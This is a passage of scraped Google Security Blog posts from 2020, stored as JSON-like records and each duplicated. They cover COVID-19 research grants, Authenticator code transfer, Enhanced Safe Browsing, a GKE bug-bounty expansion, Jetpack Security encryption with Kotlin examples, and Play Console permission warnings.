Vulnerability Research Grant  program throughout 2020, so stay tuned for future announcements and follow us on  @GoogleVRP !                                   Posted by Anna Hupa, Senior Strategist, Trust & Safety at Google  In 2015, we launched our Vulnerability Research Grant program, which allows us to recognize the time and efforts of security researchers, including the situations where they don't find any vulnerabilities. To support our community of security researchers and to help protect our users around the world during COVID-19, we are announcing a temporary expansion of our Vulnerability Research Grant efforts.   In light of new challenges caused by the coronavirus outbreak, we are expanding this initiative by  creating a COVID-19 grant fund. As of today, every Google VRP Bug Hunter who submitted at least two remunerated reports from 2018 through April 2020  will be eligible for a $1,337 research grant. We are dedicating these grants to support our researchers during this time. We are committed to protecting our users and we want to encourage the research community to help us identify threats and to prevent potential vulnerabilities in our products.  We understand the individual challenges COVID-19 has placed on the research community are different for everyone and we hope that these grants will allow us to support our Bug Hunters during these uncertain times. Even though our grants are intended to recognize the efforts of our frequent researchers regardless of their results, as always, bugs found during the grant are eligible for regular rewards per the Vulnerability Reward Program (VRP) rules. We are aware that some of our partners might not be interested in monetary grants. In such cases, we will offer the option to donate the grant to an established COVID-19 related charity and within our discretion, will monetarily match these charitable donations.  For those of you who recently joined us or are planning to start, it’s never too late. We are committed to continue the Vulnerability Research Grant program throughout 2020, so stay tuned for future announcements and follow us on @GoogleVRP!     ", "date": "April 20, 2020"},
{"website": "Google-Security", "title": "\n Introducing portability of Google Authenticator 2SV codes across Android devices\n", "author": ["Posted by Dongjing He, Software Engineer; Teddy Katz, Software Engineer; Christiaan Brand, Product Manager"], "link": "https://security.googleblog.com/2020/05/introducing-portability-of-google.html", "abstract": "                             Posted by Dongjing He, Software Engineer; Teddy Katz, Software Engineer; Christiaan Brand, Product Manager       Today is World Password Day, and we found it fitting to release an update that'll make it even easier for users to manage Google Authenticator&nbsp; 2-Step Verification &nbsp;(2SV)&nbsp;codes across multiple devices. We are introducing one of the most anticipated features - allowing users to transfer their 2SV secrets, the data used to generate 2SV codes across devices that have Google Authenticator installed. For instance, when upgrading from an old phone to a new phone. This feature has started rolling out and is available in the latest version (5.10) of Google Authenticator on Android.                   Transferring accounts from one device to another with Google Authenticator    Using 2SV, 2-Factor Authentication (2FA) or Multi-Factor Authentication (MFA) is critical to protecting your accounts from unauthorized access. With these mechanisms, users verify their identity through their password and an additional proof of identity, such as a security key or a passcode.   Google Authenticator makes it easy to use 2SV on accounts. In addition to supplying only a password when logging in, a user also enters a code generated by the Google Authenticator app on their phone. This is a safer alternative, used by millions of users, compared to passcodes via text message.  Users place their trust in Google Authenticator to keep their accounts safe. As a result, security is always a high priority. We made several explicit design decisions to minimize the attack surface while increasing the overall usability of the app.&nbsp;   We ensured that no data is sent to Google&#8217;s servers during the transfer -- communication is directly between your two devices. Your 2SV secrets can&#8217;t be accessed without having physical access to your phone and the ability to unlock it.   We implemented a variety of alerting mechanisms and in-app logs to make sure users are aware when the transfer function has been used.     You can find more information about the Google Authenticator and its usage guide  here .                                     Posted by Dongjing He, Software Engineer; Teddy Katz, Software Engineer; Christiaan Brand, Product Manager  Today is World Password Day, and we found it fitting to release an update that'll make it even easier for users to manage Google Authenticator 2-Step Verification (2SV) codes across multiple devices. We are introducing one of the most anticipated features - allowing users to transfer their 2SV secrets, the data used to generate 2SV codes across devices that have Google Authenticator installed. For instance, when upgrading from an old phone to a new phone. This feature has started rolling out and is available in the latest version (5.10) of Google Authenticator on Android.      Transferring accounts from one device to another with Google Authenticator Using 2SV, 2-Factor Authentication (2FA) or Multi-Factor Authentication (MFA) is critical to protecting your accounts from unauthorized access. With these mechanisms, users verify their identity through their password and an additional proof of identity, such as a security key or a passcode. Google Authenticator makes it easy to use 2SV on accounts. In addition to supplying only a password when logging in, a user also enters a code generated by the Google Authenticator app on their phone. This is a safer alternative, used by millions of users, compared to passcodes via text message.Users place their trust in Google Authenticator to keep their accounts safe. As a result, security is always a high priority. We made several explicit design decisions to minimize the attack surface while increasing the overall usability of the app.  We ensured that no data is sent to Google’s servers during the transfer -- communication is directly between your two devices. Your 2SV secrets can’t be accessed without having physical access to your phone and the ability to unlock it. We implemented a variety of alerting mechanisms and in-app logs to make sure users are aware when the transfer function has been used.  You can find more information about the Google Authenticator and its usage guide here.     ", "date": "May 7, 2020"},
{"website": "Google-Security", "title": "\nEnhanced Safe Browsing Protection now available in Chrome\n", "author": ["Posted by Nathan Parker, Varun Khaneja, Eric Mill and Kiran C Nair - Chrome Safe Browsing team\n"], "link": "https://security.googleblog.com/2020/05/enhanced-safe-browsing-protection-now.html", "abstract": "                             Posted by Nathan Parker, Varun Khaneja, Eric Mill and Kiran C Nair - Chrome Safe Browsing team     Over the past few years we&#8217;ve seen threats on the web becoming increasingly sophisticated. Phishing sites rotate domains very quickly to avoid being blocked, and malware campaigns are directly targeting at-risk users. We&#8217;ve realized that to combat these most effectively, security cannot be one-size-fits-all anymore: That&#8217;s why today we are announcing Enhanced Safe Browsing protection in Chrome, a new option for users who require or want a more advanced level of security while browsing the web.     Turning on Enhanced Safe Browsing will substantially increase protection from dangerous websites and downloads. By sharing real-time data with Google Safe Browsing, Chrome can proactively protect you against dangerous sites. If you&#8217;re signed in, Chrome and other Google apps you use (Gmail, Drive, etc) will be able to provide improved protection based on a holistic view of threats you encounter on the web and attacks against your Google Account. In other words, we&#8217;re bringing the intelligence of Google&#8217;s cutting-edge security tools directly into your browser.       Over the next year, we&#8217;ll be adding even more protections to this mode, including tailored warnings for phishing sites and file downloads and cross-product alerts.       Building upon Safe Browsing      Safe Browsing&#8217;s blocklist API is an existing security protocol that protects billions of devices worldwide. Every day, Safe Browsing discovers thousands of new unsafe sites and adds them to the blocklist API that is shared with the web industry. Chrome checks the URL of each site you visit or file you download against a local list, which is updated approximately every 30 minutes. Increasingly, some sophisticated phishing sites slip through that 30-minute refresh window by switching domains very quickly.      This protocol is designed so that Google cannot determine the actual URL Chrome visited from this information, and thus by necessity the same verdict is returned regardless of the user&#8217;s situation. This means Chrome can&#8217;t adjust protection based on what kinds of threats a particular user is seeing or the type of sites they normally visit. So while the Safe Browsing blocklist API remains very powerful and will continue to protect users, we&#8217;ve been looking for ways to provide more proactive and tailored protections.       How Enhanced Safe Browsing works      When you switch to Enhanced Safe Browsing, Chrome will share additional security data directly with Google Safe Browsing to enable more accurate threat assessments. For example, Chrome will check uncommon URLs in real time to detect whether the site you are about to visit may be a phishing site. Chrome will also send a small sample of pages and suspicious downloads to help discover new threats against you and other Chrome users.     If you are signed in to Chrome, this data is temporarily linked to your Google Account. We do this so that when an attack is detected against your browser or account, Safe Browsing can tailor its protections to your situation. In this way, we can provide the most precise protection without unnecessary warnings. After a short period, Safe Browsing anonymizes this data so it is no longer connected to your account.     You can opt in to this mode by visiting Privacy and Security settings > Security > and selecting the &#8220;Enhanced protection&#8221; mode under Safe Browsing. It will be rolled out gradually in M83 on desktop platforms, with Android support coming in a future release. Enterprise administrators can control this setting via the SafeBrowsingProtectionLevel policy.       Tailored protections      Chrome&#8217;s billions of users are incredibly diverse, with a full spectrum of needs and perspectives in security and privacy. We will continue to invest in both Standard and Enhanced Safe Browsing with the goal to expand Chrome&#8217;s security offerings to cover all users.                                    Posted by Nathan Parker, Varun Khaneja, Eric Mill and Kiran C Nair - Chrome Safe Browsing team   Over the past few years we’ve seen threats on the web becoming increasingly sophisticated. Phishing sites rotate domains very quickly to avoid being blocked, and malware campaigns are directly targeting at-risk users. We’ve realized that to combat these most effectively, security cannot be one-size-fits-all anymore: That’s why today we are announcing Enhanced Safe Browsing protection in Chrome, a new option for users who require or want a more advanced level of security while browsing the web.   Turning on Enhanced Safe Browsing will substantially increase protection from dangerous websites and downloads. By sharing real-time data with Google Safe Browsing, Chrome can proactively protect you against dangerous sites. If you’re signed in, Chrome and other Google apps you use (Gmail, Drive, etc) will be able to provide improved protection based on a holistic view of threats you encounter on the web and attacks against your Google Account. In other words, we’re bringing the intelligence of Google’s cutting-edge security tools directly into your browser.     Over the next year, we’ll be adding even more protections to this mode, including tailored warnings for phishing sites and file downloads and cross-product alerts.    Building upon Safe Browsing   Safe Browsing’s blocklist API is an existing security protocol that protects billions of devices worldwide. Every day, Safe Browsing discovers thousands of new unsafe sites and adds them to the blocklist API that is shared with the web industry. Chrome checks the URL of each site you visit or file you download against a local list, which is updated approximately every 30 minutes. Increasingly, some sophisticated phishing sites slip through that 30-minute refresh window by switching domains very quickly.    This protocol is designed so that Google cannot determine the actual URL Chrome visited from this information, and thus by necessity the same verdict is returned regardless of the user’s situation. This means Chrome can’t adjust protection based on what kinds of threats a particular user is seeing or the type of sites they normally visit. So while the Safe Browsing blocklist API remains very powerful and will continue to protect users, we’ve been looking for ways to provide more proactive and tailored protections.    How Enhanced Safe Browsing works   When you switch to Enhanced Safe Browsing, Chrome will share additional security data directly with Google Safe Browsing to enable more accurate threat assessments. For example, Chrome will check uncommon URLs in real time to detect whether the site you are about to visit may be a phishing site. Chrome will also send a small sample of pages and suspicious downloads to help discover new threats against you and other Chrome users.   If you are signed in to Chrome, this data is temporarily linked to your Google Account. We do this so that when an attack is detected against your browser or account, Safe Browsing can tailor its protections to your situation. In this way, we can provide the most precise protection without unnecessary warnings. After a short period, Safe Browsing anonymizes this data so it is no longer connected to your account.   You can opt in to this mode by visiting Privacy and Security settings > Security > and selecting the “Enhanced protection” mode under Safe Browsing. It will be rolled out gradually in M83 on desktop platforms, with Android support coming in a future release. Enterprise administrators can control this setting via the SafeBrowsingProtectionLevel policy.    Tailored protections   Chrome’s billions of users are incredibly diverse, with a full spectrum of needs and perspectives in security and privacy. We will continue to invest in both Standard and Enhanced Safe Browsing with the goal to expand Chrome’s security offerings to cover all users.      ", "date": "May 19, 2020"},
{"website": "Google-Security", "title": "\nExpanding our work with the open source security community\n", "author": ["Posted by Eduardo Vela, Vulnerability Collector, Google "], "link": "https://security.googleblog.com/2020/05/expanding-our-work-with-open-source.html", "abstract": "                             Posted by Eduardo Vela, Vulnerability Collector, Google&nbsp;     At Google, we&#8217;ve always believed in the benefits and importance of using open source technologies to innovate. We enjoy being a part of the community and we want to give back in new ways. As part of this effort, we are excited to announce an expansion of our  Google Vulnerability Rewards Program (VRP)  to cover all the critical open-source dependencies of  Google Kubernetes Engine (GKE) . We have designed this expansion with the goal of incentivizing the security community to work even more closely with open source projects, supporting the maintainers whose work we all rely on.    The CNCF, in partnership with Google, recently  announced  a bug bounty program  for Kubernetes  that pays up to $10,000 for vulnerabilities discovered within the project. And today, in addition to that, we are expanding the scope of the Google VRP program to also include privilege escalation bugs in a hardened GKE lab cluster we've set up for this purpose. This will cover exploitable vulnerabilities in all dependencies that can lead to a node compromise, such as privilege escalation bugs in the Linux kernel, as well as in the underlying hardware or other components of our infrastructure that could allow for privilege escalation inside a GKE cluster.            How it works   We have  set up a lab environment  on GKE based on an open-source Kubernetes-based Capture-the-Flag (CTF) project called  kCTF . Participants will be required to:       Break out of a containerized environment running on a Kubernetes pod and,   Read one of two secret flags: One flag is on the same pod, and the other one is in another Kubernetes pod in a different namespace.    Flags will be changed often, and participants need to submit the secret flag as proof of successful exploitation. The lab environment does not store any data (such as the commands or files used to exploit it), so participants need the flags to demonstrate they were able to compromise it.       The rewards will work in the following way:     Bugs that affect the lab GKE environment that can lead to stealing both flags will be rewarded up to 10,000 USD, but we will review each report on a case-by-case basis. Any vulnerabilities are in scope, regardless of where they are: Linux, Kubernetes, kCTF, Google, or any other dependency. Instructions on how to submit the flags and exploits are available  here .   Bugs that are 100% in Google code, qualify for an additional Google VRP reward.   Bugs that are 100% in Kubernetes code, qualify for an additional CNCF Kubernetes reward.    Any vulnerabilities found outside of GKE (like  Kubernetes or the Linux kernel ) should be reported to the corresponding upstream project security teams. To make this program expansion as efficient as possible for the maintainers, we will only reward vulnerabilities shown to be exploitable by stealing a flag. If your exploit relies on something in upstream Kubernetes, the Linux Kernel, or any other dependency, you need to report it there first, get it resolved, and then report it to Google.&nbsp;See instructions  here .    The GKE lab environment is built on top of a CTF infrastructure that we just open-sourced on  GitHub . The infrastructure is new, and we are looking forward to receiving feedback from the community before it can be actively used in CTF competitions. By including the CTF infrastructure in the scope of the Google VRP, we want to incentivise the community to help us secure not just the CTF competitions that will use it, but also GKE and the broader Kubernetes ecosystems.    In March 2020, we announced  the winner for the first Google Cloud Platform (GCP) VRP Prize  and since then we have seen increased interest and research happening on Google Cloud. With this new initiative, we hope to bring even more awareness to Google Cloud  by experienced security researchers, so we can all work together to secure our shared open-source foundations.                                     Posted by Eduardo Vela, Vulnerability Collector, Google   At Google, we’ve always believed in the benefits and importance of using open source technologies to innovate. We enjoy being a part of the community and we want to give back in new ways. As part of this effort, we are excited to announce an expansion of our Google Vulnerability Rewards Program (VRP) to cover all the critical open-source dependencies of Google Kubernetes Engine (GKE). We have designed this expansion with the goal of incentivizing the security community to work even more closely with open source projects, supporting the maintainers whose work we all rely on.  The CNCF, in partnership with Google, recently announced a bug bounty program for Kubernetes that pays up to $10,000 for vulnerabilities discovered within the project. And today, in addition to that, we are expanding the scope of the Google VRP program to also include privilege escalation bugs in a hardened GKE lab cluster we've set up for this purpose. This will cover exploitable vulnerabilities in all dependencies that can lead to a node compromise, such as privilege escalation bugs in the Linux kernel, as well as in the underlying hardware or other components of our infrastructure that could allow for privilege escalation inside a GKE cluster.    How it works We have set up a lab environment on GKE based on an open-source Kubernetes-based Capture-the-Flag (CTF) project called kCTF. Participants will be required to:   Break out of a containerized environment running on a Kubernetes pod and, Read one of two secret flags: One flag is on the same pod, and the other one is in another Kubernetes pod in a different namespace.  Flags will be changed often, and participants need to submit the secret flag as proof of successful exploitation. The lab environment does not store any data (such as the commands or files used to exploit it), so participants need the flags to demonstrate they were able to compromise it.   The rewards will work in the following way:  Bugs that affect the lab GKE environment that can lead to stealing both flags will be rewarded up to 10,000 USD, but we will review each report on a case-by-case basis. Any vulnerabilities are in scope, regardless of where they are: Linux, Kubernetes, kCTF, Google, or any other dependency. Instructions on how to submit the flags and exploits are available here. Bugs that are 100% in Google code, qualify for an additional Google VRP reward. Bugs that are 100% in Kubernetes code, qualify for an additional CNCF Kubernetes reward.  Any vulnerabilities found outside of GKE (like Kubernetes or the Linux kernel) should be reported to the corresponding upstream project security teams. To make this program expansion as efficient as possible for the maintainers, we will only reward vulnerabilities shown to be exploitable by stealing a flag. If your exploit relies on something in upstream Kubernetes, the Linux Kernel, or any other dependency, you need to report it there first, get it resolved, and then report it to Google. See instructions here.  The GKE lab environment is built on top of a CTF infrastructure that we just open-sourced on GitHub. The infrastructure is new, and we are looking forward to receiving feedback from the community before it can be actively used in CTF competitions. By including the CTF infrastructure in the scope of the Google VRP, we want to incentivise the community to help us secure not just the CTF competitions that will use it, but also GKE and the broader Kubernetes ecosystems.  In March 2020, we announced the winner for the first Google Cloud Platform (GCP) VRP Prize and since then we have seen increased interest and research happening on Google Cloud. With this new initiative, we hope to bring even more awareness to Google Cloud  by experienced security researchers, so we can all work together to secure our shared open-source foundations.     ", "date": "May 28, 2020"},
{"website": "Google-Security", "title": "\nData Encryption on Android with Jetpack Security\n", "author": [], "link": "https://security.googleblog.com/2020/02/data-encryption-on-android-with-jetpack.html", "abstract": "                                   Posted by  Jon Markoff, Staff Developer Advocate, Android Security              Have you ever tried to encrypt data in your app?  As a developer, you want to keep data safe, and in the hands of the party intended to use. But if you&#8217;re like most Android developers, you don&#8217;t have a dedicated security team to help encrypt your app&#8217;s data properly. By searching the web to learn how to encrypt data, you might get answers that are several years out of date and provide incorrect examples.     The  Jetpack Security  (JetSec) crypto library provides abstractions for encrypting Files and SharedPreferences objects. The library promotes the use of the  AndroidKeyStore  while using safe and well-known  cryptographic primitives . Using EncryptedFile and EncryptedSharedPreferences allows you to locally protect files that may contain sensitive data, API keys, OAuth tokens, and other types of secrets.      Why would you want to encrypt data in your app? Doesn&#8217;t Android, since 5.0,  encrypt the contents of the user's data partition  by default? It certainly does, but there are some use cases where you may want an extra level of protection. If your app uses  shared storage , you should encrypt the data. In the app home directory, your app should encrypt data if your app handles sensitive information including but not limited to personally identifiable information (PII), health records, financial details, or enterprise data. When possible, we recommend that you tie this information to biometrics for an extra level of protection.      Jetpack Security is based on  Tink , an open-source, cross-platform security project from Google. Tink might be appropriate if you need general encryption, hybrid encryption, or something similar. Jetpack Security data structures are fully compatible with Tink.    Key Generation      Before we jump into encrypting your data, it&#8217;s important to understand how your encryption keys will be kept safe. Jetpack Security uses a  master key , which encrypts all subkeys that are used for each cryptographic operation. JetSec provides a recommended default master key in the MasterKeys class. This class uses a basic AES256-GCM key which is generated and stored in the AndroidKeyStore. The AndroidKeyStore is a container which stores cryptographic keys in the TEE or StrongBox, making them hard to extract. Subkeys are stored in a configurable  SharedPreferences object.      Primarily, we use the AES256_GCM_SPEC specification in Jetpack Security, which is recommended for general use cases. AES256-GCM is symmetric and generally fast on modern devices.      val keyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)      For apps that require more configuration, or handle very sensitive data, it&#8217;s recommended to build your  KeyGenParameterSpec , choosing options that make sense for your use. Time-bound keys with  BiometricPrompt  can provide an extra level of protection against rooted or compromised devices.     Important options:        userAuthenticationRequired()  and  userAuthenticationValiditySeconds()  can be used to create a time-bound key. Time-bound keys require authorization using  BiometricPrompt  for both encryption and decryption of symmetric keys.     unlockedDeviceRequired()  sets a flag that helps ensure key access cannot happen if the device is not unlocked. This flag is available on Android Pie and higher.   Use  setIsStrongBoxBacked() , to run crypto operations on a stronger separate chip. This has a slight performance impact, but is more secure. It&#8217;s available on some devices that run Android Pie or higher.        Note:  If your app needs to encrypt data in the background, you should not use time-bound keys or require that the device is unlocked, as you will not be able to accomplish this without a user present.     // Custom Advanced Master Key val advancedSpec = KeyGenParameterSpec.Builder(     \"master_key\",     KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT ).apply {     setBlockModes(KeyProperties.BLOCK_MODE_GCM)     setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)     setKeySize(256)     setUserAuthenticationRequired(true)     setUserAuthenticationValidityDurationSeconds(15) // must be larger than 0     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {         setUnlockedDeviceRequired(true)         setIsStrongBoxBacked(true)     } }.build()  val advancedKeyAlias = MasterKeys.getOrCreate(advancedSpec)     Unlocking time-bound keys      You must use BiometricPrompt to authorize the device if your key was created with the following options:        userAuthenticationRequired  is true    userAuthenticationValiditySeconds  > 0       After the user authenticates, the keys are unlocked for the amount of time set in the validity seconds field. The AndroidKeystore does not have an API to query key settings, so your app  must keep track of these settings. You should build your BiometricPrompt instance in the  onCreate()  method of the activity where you present the dialog to the user.     BiometricPrompt code to unlock time-bound keys    // Activity.onCreate  val promptInfo = PromptInfo.Builder()     .setTitle(\"Unlock?\")     .setDescription(\"Would you like to unlock this key?\")     .setDeviceCredentialAllowed(true)     .build()  val biometricPrompt = BiometricPrompt(     this, // Activity     ContextCompat.getMainExecutor(this),     authenticationCallback )  private val authenticationCallback = object : AuthenticationCallback() {         override fun onAuthenticationSucceeded(             result: AuthenticationResult         ) {             super.onAuthenticationSucceeded(result)             // Unlocked -- do work here.         }         override fun onAuthenticationError(             errorCode: Int, errString: CharSequence         ) {             super.onAuthenticationError(errorCode, errString)             // Handle error.         }     }  To use: biometricPrompt.authenticate(promptInfo)    Encrypt Files      Jetpack Security includes an EncryptedFile class, which removes the challenges of encrypting file data. Similar to File, EncryptedFile provides a FileInputStream object for reading and a FileOutputStream object for writing. Files are encrypted using  Streaming AEAD, which follows the OAE2 definition . The data is divided into chunks and encrypted using AES256-GCM in such a way that it's not possible to reorder.    val secretFile = File(filesDir, \"super_secret\") val encryptedFile = EncryptedFile.Builder(     secretFile,     applicationContext,     advancedKeyAlias,     FileEncryptionScheme.AES256_GCM_HKDF_4KB)     .setKeysetAlias(\"file_key\") // optional     .setKeysetPrefName(\"secret_shared_prefs\") // optional     .build()  encryptedFile.openFileOutput().use { outputStream ->     // Write data to your encrypted file }  encryptedFile.openFileInput().use { inputStream ->     // Read data from your encrypted file }     Encrypt SharedPreferences      If your application needs to save Key-value pairs - such as API keys - JetSec provides the EncryptedSharedPreferences class, which uses the same SharedPreferences interface that you&#8217;re used to.     Both keys and values are encrypted. Keys are encrypted using  AES256-SIV-CMAC , which provides a deterministic cipher text; values are encrypted with AES256-GCM and are bound to the encrypted key. This scheme allows the key data to be encrypted safely, while still allowing lookups.    EncryptedSharedPreferences.create(     \"my_secret_prefs\",     advancedKeyAlias,     applicationContext,     PrefKeyEncryptionScheme.AES256_SIV,     PrefValueEncryptionScheme.AES256_GCM ).edit {     // Update secret values }    More Resources       FileLocker  is a sample app on the Android Security GitHub samples page. It&#8217;s a great example of how to use File encryption using Jetpack Security.     Happy Encrypting!                                         Posted by Jon Markoff, Staff Developer Advocate, Android Security       Have you ever tried to encrypt data in your app?  As a developer, you want to keep data safe, and in the hands of the party intended to use. But if you’re like most Android developers, you don’t have a dedicated security team to help encrypt your app’s data properly. By searching the web to learn how to encrypt data, you might get answers that are several years out of date and provide incorrect examples.   The Jetpack Security (JetSec) crypto library provides abstractions for encrypting Files and SharedPreferences objects. The library promotes the use of the AndroidKeyStore while using safe and well-known cryptographic primitives. Using EncryptedFile and EncryptedSharedPreferences allows you to locally protect files that may contain sensitive data, API keys, OAuth tokens, and other types of secrets.    Why would you want to encrypt data in your app? Doesn’t Android, since 5.0, encrypt the contents of the user's data partition by default? It certainly does, but there are some use cases where you may want an extra level of protection. If your app uses shared storage, you should encrypt the data. In the app home directory, your app should encrypt data if your app handles sensitive information including but not limited to personally identifiable information (PII), health records, financial details, or enterprise data. When possible, we recommend that you tie this information to biometrics for an extra level of protection.    Jetpack Security is based on Tink, an open-source, cross-platform security project from Google. Tink might be appropriate if you need general encryption, hybrid encryption, or something similar. Jetpack Security data structures are fully compatible with Tink.  Key Generation    Before we jump into encrypting your data, it’s important to understand how your encryption keys will be kept safe. Jetpack Security uses a master key, which encrypts all subkeys that are used for each cryptographic operation. JetSec provides a recommended default master key in the MasterKeys class. This class uses a basic AES256-GCM key which is generated and stored in the AndroidKeyStore. The AndroidKeyStore is a container which stores cryptographic keys in the TEE or StrongBox, making them hard to extract. Subkeys are stored in a configurable  SharedPreferences object.    Primarily, we use the AES256_GCM_SPEC specification in Jetpack Security, which is recommended for general use cases. AES256-GCM is symmetric and generally fast on modern devices.    val keyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)    For apps that require more configuration, or handle very sensitive data, it’s recommended to build your KeyGenParameterSpec, choosing options that make sense for your use. Time-bound keys with BiometricPrompt can provide an extra level of protection against rooted or compromised devices.   Important options:    userAuthenticationRequired() and userAuthenticationValiditySeconds() can be used to create a time-bound key. Time-bound keys require authorization using BiometricPrompt for both encryption and decryption of symmetric keys.   unlockedDeviceRequired() sets a flag that helps ensure key access cannot happen if the device is not unlocked. This flag is available on Android Pie and higher.  Use setIsStrongBoxBacked(), to run crypto operations on a stronger separate chip. This has a slight performance impact, but is more secure. It’s available on some devices that run Android Pie or higher.    Note: If your app needs to encrypt data in the background, you should not use time-bound keys or require that the device is unlocked, as you will not be able to accomplish this without a user present.   // Custom Advanced Master Key val advancedSpec = KeyGenParameterSpec.Builder(     \"master_key\",     KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT ).apply {     setBlockModes(KeyProperties.BLOCK_MODE_GCM)     setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)     setKeySize(256)     setUserAuthenticationRequired(true)     setUserAuthenticationValidityDurationSeconds(15) // must be larger than 0     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {         setUnlockedDeviceRequired(true)         setIsStrongBoxBacked(true)     } }.build()  val advancedKeyAlias = MasterKeys.getOrCreate(advancedSpec)   Unlocking time-bound keys    You must use BiometricPrompt to authorize the device if your key was created with the following options:    userAuthenticationRequired is true  userAuthenticationValiditySeconds > 0    After the user authenticates, the keys are unlocked for the amount of time set in the validity seconds field. The AndroidKeystore does not have an API to query key settings, so your app  must keep track of these settings. You should build your BiometricPrompt instance in the onCreate() method of the activity where you present the dialog to the user.   BiometricPrompt code to unlock time-bound keys  // Activity.onCreate  val promptInfo = PromptInfo.Builder()     .setTitle(\"Unlock?\")     .setDescription(\"Would you like to unlock this key?\")     .setDeviceCredentialAllowed(true)     .build()  val biometricPrompt = BiometricPrompt(     this, // Activity     ContextCompat.getMainExecutor(this),     authenticationCallback )  private val authenticationCallback = object : AuthenticationCallback() {         override fun onAuthenticationSucceeded(             result: AuthenticationResult         ) {             super.onAuthenticationSucceeded(result)             // Unlocked -- do work here.         }         override fun onAuthenticationError(             errorCode: Int, errString: CharSequence         ) {             super.onAuthenticationError(errorCode, errString)             // Handle error.         }     }  To use: biometricPrompt.authenticate(promptInfo)  Encrypt Files    Jetpack Security includes an EncryptedFile class, which removes the challenges of encrypting file data. Similar to File, EncryptedFile provides a FileInputStream object for reading and a FileOutputStream object for writing. Files are encrypted using Streaming AEAD, which follows the OAE2 definition. The data is divided into chunks and encrypted using AES256-GCM in such a way that it's not possible to reorder.  val secretFile = File(filesDir, \"super_secret\") val encryptedFile = EncryptedFile.Builder(     secretFile,     applicationContext,     advancedKeyAlias,     FileEncryptionScheme.AES256_GCM_HKDF_4KB)     .setKeysetAlias(\"file_key\") // optional     .setKeysetPrefName(\"secret_shared_prefs\") // optional     .build()  encryptedFile.openFileOutput().use { outputStream ->     // Write data to your encrypted file }  encryptedFile.openFileInput().use { inputStream ->     // Read data from your encrypted file }   Encrypt SharedPreferences    If your application needs to save Key-value pairs - such as API keys - JetSec provides the EncryptedSharedPreferences class, which uses the same SharedPreferences interface that you’re used to.   Both keys and values are encrypted. Keys are encrypted using AES256-SIV-CMAC, which provides a deterministic cipher text; values are encrypted with AES256-GCM and are bound to the encrypted key. This scheme allows the key data to be encrypted safely, while still allowing lookups.  EncryptedSharedPreferences.create(     \"my_secret_prefs\",     advancedKeyAlias,     applicationContext,     PrefKeyEncryptionScheme.AES256_SIV,     PrefValueEncryptionScheme.AES256_GCM ).edit {     // Update secret values }  More Resources    FileLocker is a sample app on the Android Security GitHub samples page. It’s a great example of how to use File encryption using Jetpack Security.   Happy Encrypting!      ", "date": "February 25, 2020"},
{"website": "Google-Security", "title": "\nHelping Developers with Permission Requests\n", "author": ["Posted by Sai Teja Peddinti, Nina Taft and Igor Bilogrevic from PDPO Applied Privacy Research, and Pauline Anthonysamy from Android Security and Privacy."], "link": "https://security.googleblog.com/2020/02/helping-developers-with-permission.html", "abstract": "                             Posted by Sai Teja Peddinti, Nina Taft and Igor Bilogrevic from PDPO Applied Privacy Research, and Pauline Anthonysamy from Android Security and Privacy.     User trust is critical to the success of developers of every size. On the Google Play Store, we aim to help developers boost the trust of their users, by surfacing signals in the Developer Console about how to improve their privacy posture. Towards this aim, we surface a message to developers when we think their app is asking for permission that is likely unnecessary.    This is important because numerous studies have shown that user trust can be affected when the purpose of a permission is not clear. 1  In addition, research has shown that when users are given a choice between similar apps, and one of them requests fewer permissions than the other, they choose the app with fewer permissions. 2     Determining whether or not a permission request is necessary can be challenging. Android developers request permissions in their apps for many reasons - some related to core functionality, and others related to personalization, testing, advertising, and other factors. To do this, we identify a peer set of apps with similar functionality and compare a developer&#8217;s permission requests to that of their peers. If a very large percentage of these similar apps are not asking for a permission, and the developer is, we then let the developer know that their permission request is unusual compared to their peers. Our determination of the peer set is more involved than simply using Play Store categories. Our algorithm combines multiple signals that feed Natural Language Processing (NLP) and deep learning technology to determine this set. A full explanation of our method is outlined in our recent publication, entitled &#8220; Reducing Permissions Requests in Mobile Apps &#8221; that appeared in the Internet Measurement Conference (IMC) in October 2019. 3  (Note that the threshold for surfacing the warning signal, as stated in this paper, is subject to change.)   We surface this information to developers in the Play Console and we let the developer make the final call as to whether or not the permission is truly necessary. It is possible that the developer has a feature unlike all of its peers. Once a developer removes a permission, they won&#8217;t see the warning any longer. Note that the warning is based on our computation of the set of peer apps similar to the developers. This is an evolving set, frequently recomputed, so the message may go away if there is an underlying change to the set of peers apps and their behavior. Similarly, even if a developer is not currently seeing a warning about a permission, they might in the future if the underlying peer set and its behavior changes. An example warning is depicted below.            This warning also helps to remind developers that they are not obligated to include all of the permission requests occurring within the libraries they include inside their apps. We are pleased to say that in the first year after deployment of this advice signal nearly 60% of warned apps removed permissions. Moreover, this occurred across all Play Store categories and all app popularity levels. The breadth of this developer response impacted over 55 billion app installs. 3  This warning is one component of Google&#8217;s larger strategy to help protect users and help developers achieve good security and privacy practices, such as  Project Strobe ,  our guidelines on permissions best practices , and  our requirements around safe traffic handling .    Acknowledgements     Giles Hogben, Android Play Dashboard and Pre-Launch Report teams       References    [1] Modeling Users&#8217; Mobile App Privacy Preferences: Restoring Usability in a Sea of Permission Settings, by J. Lin B. Liu, N. Sadeh and J. Hong. In Proceedings of Usenix Symposium on Privacy &amp; Security (SOUPS) 2014.     [2] Using Personal Examples to Improve Risk Communication for Security &amp; Privacy Decisions, by M. Harbach, M. Hettig, S. Weber, and M. Smith. In Proceedings of the SIGCHI Conference on Human Computing Factors in Computing Systems, 2014.     [3] Reducing Permission Requests in Mobile Apps, by S. T. Peddinti, I. Bilogrevic, N. Taft, M Pelikan, U. Erlingsson, P. Anthonysamy and G. Hogben. In Proceedings of ACM Internet Measurement Conference (IMC) 2019.                                     Posted by Sai Teja Peddinti, Nina Taft and Igor Bilogrevic from PDPO Applied Privacy Research, and Pauline Anthonysamy from Android Security and Privacy.   User trust is critical to the success of developers of every size. On the Google Play Store, we aim to help developers boost the trust of their users, by surfacing signals in the Developer Console about how to improve their privacy posture. Towards this aim, we surface a message to developers when we think their app is asking for permission that is likely unnecessary.   This is important because numerous studies have shown that user trust can be affected when the purpose of a permission is not clear.1 In addition, research has shown that 